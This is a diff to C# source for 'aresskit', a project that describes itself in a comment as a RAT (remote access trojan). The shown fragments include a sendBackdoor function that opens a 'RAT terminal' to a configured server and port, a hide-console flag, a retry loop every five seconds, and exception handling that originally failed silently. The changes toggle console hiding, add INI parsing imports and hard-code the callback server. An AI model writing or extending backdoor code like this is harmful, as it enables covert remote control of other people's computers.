@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Linq;
 using System.Reflection;
+using IniParser;
+using IniParser.Model;
 
 namespace aresskit
 {
@@ -8,9 +10,10 @@ namespace aresskit
     {   
         const string server = "localhost";
         const int port = 9000;
-        const bool hideConsole = true;
+        const bool hideConsole = false;
         const string cmdSplitter = "::";
         
+
         private static void sendBackdoor(string server, int port)
         {
             try
@@ -151,13 +154,10 @@ namespace aresskit
                     try
                     {
                         // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
-                        if (args.Length != 0)
-                            sendBackdoor(args[0], int.Parse(args[1]));
-                        else
-                            sendBackdoor(server, port);
+                        sendBackdoor(server, port);
                     }
-                    catch (Exception)
-                    {} // pass silently
+                    catch (Exception e)
+                    { Console.WriteLine(e); } // pass silently
                 }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
